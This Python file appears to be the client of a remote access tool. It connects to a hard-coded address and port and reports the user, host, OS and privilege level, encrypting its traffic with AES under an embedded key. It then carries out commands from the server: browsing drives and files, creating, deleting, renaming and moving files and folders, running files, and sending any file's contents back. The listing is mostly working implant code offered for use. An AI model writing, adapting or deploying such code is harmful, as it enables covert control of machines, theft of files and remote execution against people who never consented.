import os
import socket
import threading
import time
import platform
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from pathlib import Path
from datetime import datetime

class EntryPoint:
    @staticmethod
    def main():
        print("Starting application...")
        MainForm().start()
        print("App Started...")

class MainForm:
    def __init__(self):
        self.client = None
        self.connection_thread = None
        self.encryption_key = "xilAeTlwiiVXyBD0qxHJHpW8d8tbPqTw"
        self.delay = 100
        self.client_port = 4440
        self.client_ip = "127.0.0.1"
        self.output_stream = None
        self.input_stream = None

    def start(self):
        self.connection_thread = threading.Thread(target=self.connect)
        self.connection_thread.start()

    def connect(self):
        print("Starting connect method...")
        while True:
            try:
                print("Connect: Attempting connection...")
                if self.client is None or self.client._closed:
                    if self.delay > 0:
                        print(f"Connect: Delaying for {self.delay} milliseconds...")
                        time.sleep(self.delay / 1000)

                    self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.client.connect((self.client_ip, self.client_port))
                    self.output_stream = self.client.makefile('w')
                    self.input_stream = self.client.makefile('r')

                    print(f"Connect: Successfully connected to {self.client_ip}:{self.client_port}")

                    new_connection_message = f"NewConnection|Python|{os.getlogin()}|{socket.gethostname()}|{platform.system()}|{platform.version()}|{self.get_privileges()}"

                    print(f"Connect: newConnectionMessage: {new_connection_message}")

                    encrypted_message = self.AESEncrypt(new_connection_message, self.encryption_key)
                    print(f"Connect: Encrypted message: {encrypted_message}")

                    self.send(encrypted_message)
                    print("Connect: Message sent")

                    threading.Thread(target=self.read).start()
                    break  # Exit loop on successful connection
            except Exception as ex:
                if self.client is not None:
                    self.client.close()
                    self.client = None

                print(f"Exception in Connect: {ex}")
                time.sleep(4)  # Retry after delay

    def read(self):
        print("Starting read method...")
        try:
            while True:
                message = self.input_stream.readline().strip()
                if message:
                    print(f"Read: Message received: {message}")
                    message = self.AESDecrypt(message, self.encryption_key)
                    print(f"Read: Decrypted message: {message}")
                    self.parse(message)
        except Exception as e:
            print(f"Exception in Read: {e}")
            time.sleep(4)
            self.connect()

    def send(self, message):
        print("Starting send method...")
        try:
            self.output_stream.write(message + "\n")
            self.output_stream.flush()
            print("Send: Message sent")
        except Exception as e:
            print(f"Exception in Send: {e}")

    def parse(self, msg):
        print("Starting parse method...")
        print(f"Receiving message: {msg}")
        try:
            if msg.startswith("NewConnection"):
                pass
            elif msg.startswith("Disconnected"):
                self.restart_connection()
            elif msg.startswith("Restart"):
                self.restart_application()
            elif msg.startswith("Close"):
                exit(0)
            elif msg.startswith("ListDrives"):
                self.list_drives()
            elif msg.startswith("ListFiles"):
                self.show_files(msg.replace("ListFiles", ""))
            elif msg.startswith("mkdir"):
                self.create_directory(msg.replace("mkdir", ""))
            elif msg.startswith("rmdir"):
                self.delete_directory(msg.replace("rmdir", ""))
            elif msg.startswith("rnfolder"):
                self.rename_directory(msg.replace("rnfolder", ""))
            elif msg.startswith("mvdir"):
                self.move_directory(msg.replace("mvdir", ""))
            elif msg.startswith("mkfile"):
                self.create_new_file(msg)
            elif msg.startswith("rmfile"):
                self.delete_file(msg.replace("rmfile", ""))
            elif msg.startswith("exfile"):
                self.execute_file(msg.replace("exfile", ""))
            elif msg.startswith("exdir"):
                self.execute_directory(msg.replace("exdir", ""))
            elif msg.startswith("rnfile"):
                self.rename_file(msg.replace("rnfile", ""))
            elif msg.startswith("movefile"):
                self.move_file(msg.replace("movefile", ""))
            elif msg.startswith("sharefile"):
                self.share_file(msg.replace("sharefile", ""))
            elif msg.startswith("FileUpload"):
                self.upload_file(msg.replace("FileUpload", ""))
        except Exception as e:
            print(f"Exception in Parse: {e}")

    def restart_connection(self):
        print("Restarting connection...")
        self.connection_thread = threading.Thread(target=self.connect)
        self.connection_thread.start()

    def restart_application(self):
        print("Restarting application...")
        # Implement restart logic

    def get_privileges(self):
        return "User"

    @staticmethod
    def AESEncrypt(input, key):
        secret_key = MainForm.getKey(key)
        cipher = AES.new(secret_key, AES.MODE_ECB)
        encrypted_bytes = cipher.encrypt(pad(input.encode('utf-8'), AES.block_size))
        return base64.b64encode(encrypted_bytes).decode('utf-8')

    @staticmethod
    def AESDecrypt(input, key):
        secret_key = MainForm.getKey(key)
        cipher = AES.new(secret_key, AES.MODE_ECB)
        decrypted_bytes = unpad(cipher.decrypt(base64.b64decode(input)), AES.block_size)
        return decrypted_bytes.decode('utf-8')

    @staticmethod
    def getKey(key):
        sha = hashlib.sha256()
        sha.update(key.encode('utf-8'))
        return sha.digest()

    def list_drives(self):
        try:
            drives = [f"{drive}:\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{drive}:\\")]
            drives_string = "|".join(drives)
            self.send(self.AESEncrypt(f"Drives{drives_string}", self.encryption_key))
        except Exception as e:
            print(f"Error in list_drives: {e}")


    def show_files(self, path):
        try:
            items = f"{path}|"

            # Get all directories
            for entry in os.scandir(path):
                if entry.is_dir():
                    creation_time = datetime.fromtimestamp(entry.stat().st_ctime).isoformat()
                    last_access_time = datetime.fromtimestamp(entry.stat().st_atime).isoformat()
                    items += f"{entry.name}|{creation_time}|{last_access_time}||1\n"

            # Get all files
            for entry in os.scandir(path):
                if entry.is_file():
                    creation_time = datetime.fromtimestamp(entry.stat().st_ctime).isoformat()
                    last_access_time = datetime.fromtimestamp(entry.stat().st_atime).isoformat()
                    file_size = self.format_file_size(entry.stat().st_size)
                    items += f"{entry.name}|{creation_time}|{last_access_time}|{file_size}|0\n"

            items = items.strip()

            self.send(self.AESEncrypt("FileManagerFiles" + items, self.encryption_key))
        except Exception as e:
            print(f"Error in show_files: {e}")


    def format_file_size(self, size):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024.0:
                return f"{size:.2f}{unit}"
            size /= 1024.0

    def create_directory(self, path):
        try:
            os.makedirs(path, exist_ok=True)
        except Exception as e:
            print(f"Error in createDirectory: {e}")

    def delete_file(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            print(f"Error in deleteFile: {e}")

    def execute_file(self, path):
        try:
            if os.path.exists(path):
                os.startfile(path)
        except Exception as e:
            print(f"Error in executeFile: {e}")

    def execute_directory(self, path):
        try:
            if os.path.exists(path):
                os.startfile(path)
        except Exception as e:
            print(f"Error in executeDirectory: {e}")

    def share_file(self, filepath):
        try:
            with open(filepath, "rb") as file:
                file_bytes = file.read()
            base64_string = base64.b64encode(file_bytes).decode('utf-8')
            data_to_encrypt = f"IncomingFile{base64_string}"
            encrypted_data = self.AESEncrypt(data_to_encrypt, self.encryption_key)
            self.send(encrypted_data)
        except Exception as e:
            print(f"Error in shareFile: {e}")

    def upload_file(self, msg):
        # Implement file upload logic
        pass

    def rename_directory(self, path):
        try:
            old_path, new_path = path.split("|")
            os.rename(old_path, new_path)
        except Exception as e:
            print(f"Error in renameDirectory: {e}")

    def move_directory(self, path):
        try:
            source_path, destination_path = path.split("|")
            os.rename(source_path, destination_path)
        except Exception as e:
            print(f"Error in moveDirectory: {e}")

    def create_new_file(self, txt):
        try:
            content_without_mkfile = txt.replace("mkfile", "")
            target_path, content = content_without_mkfile.split("|", 1)
            with open(target_path, "w") as file:
                file.write(content)
        except Exception as e:
            print(f"Error in createNewFile: {e}")

    def rename_file(self, path):
        try:
            old_path, new_path = path.split("|")
            os.rename(old_path, new_path)
        except Exception as e:
            print(f"Error in renameFile: {e}")

    def move_file(self, path):
        try:
            source_path, destination_path = path.split("|")
            os.rename(source_path, destination_path)
        except Exception as e:
            print(f"Error in moveFile: {e}")

    def delete_directory(self, path):
        try:
            for root, dirs, files in os.walk(path, topdown=False):
                for file in files:
                    os.remove(os.path.join(root, file))
                for dir in dirs:
                    os.rmdir(os.path.join(root, dir))
            os.rmdir(path)
        except Exception as e:
            print(f"Error in deleteDirectory: {e}")

if __name__ == "__main__":
    EntryPoint.main()
